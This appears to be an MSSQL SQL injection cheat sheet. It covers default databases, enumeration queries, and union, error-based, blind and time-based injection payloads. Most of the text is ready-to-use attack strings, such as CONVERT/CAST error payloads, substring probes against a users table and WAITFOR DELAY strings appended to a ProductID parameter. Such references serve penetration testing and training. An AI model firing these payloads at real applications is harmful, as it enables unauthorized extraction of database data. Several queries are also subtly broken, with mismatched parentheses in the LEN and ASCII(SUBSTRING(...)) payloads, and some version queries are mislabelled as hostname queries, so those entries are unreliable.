## MSSQL Default Databases

| Name               | Description                          |
| ------------------ | ------------------------------------ |
| pubs               | Not available on MSSQL 2005          |
| model              | Available in all versions            |
| msdb               | Available in all versions            |
| tempdb             | Available in all versions            |
| northwind          | Available in all versions            |
| information_schema | Available from MSSQL 2000 and higher |


## MSSQL Comments

| Type                  | Description     |
| --------------------- | --------------- |
| `/* MSSQL Comment */` | C-style comment |
| `--`                  | SQL comment     |
| `;%00`                | Null byte       |


## MSSQL Enumeration

| Description     | SQL Query                                 |
| --------------- | ----------------------------------------- |
| DBMS version    | `SELECT @@version`                        |
| Database name   | `SELECT DB_NAME()`                        |
| Database schema | `SELECT SCHEMA_NAME()`                    |
| Hostname        | `SELECT HOST_NAME()`                      |
| Hostname        | `SELECT @@hostname`                       |
| Hostname        | `SELECT @@SERVERNAME`                     |
| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
| User            | `SELECT CURRENT_USER`                     |
| User            | `SELECT user_name();`                     |
| User            | `SELECT system_user;`                     |
| User            | `SELECT user;`                            |


### MSSQL List Databases

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### MSSQL List Tables

```sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

### MSSQL List Columns

```sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## MSSQL Union Based

* Extract databases names

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
    ```

* Extract tables from Injection database

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

* Extract columns for the table Users

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

* Finally extract the data

    ```sql
    SELECT  UserId, UserName from Users
    ```

## MSSQL Error Based

| Name    | Payload                                                          |
| ------- | ---------------------------------------------------------------- |
| CONVERT | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN      | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -`         |
| EQUAL   | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -`               |
| CAST    | `CAST((SELECT @@version) AS INT)`                                |

* For integer inputs

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

* For string inputs

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```

## MSSQL Blind Based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### MSSQL Blind With Substring Equivalent

| Function    | Example                                  |
| ----------- | ---------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |

Examples:

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## MSSQL Time Based

In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```
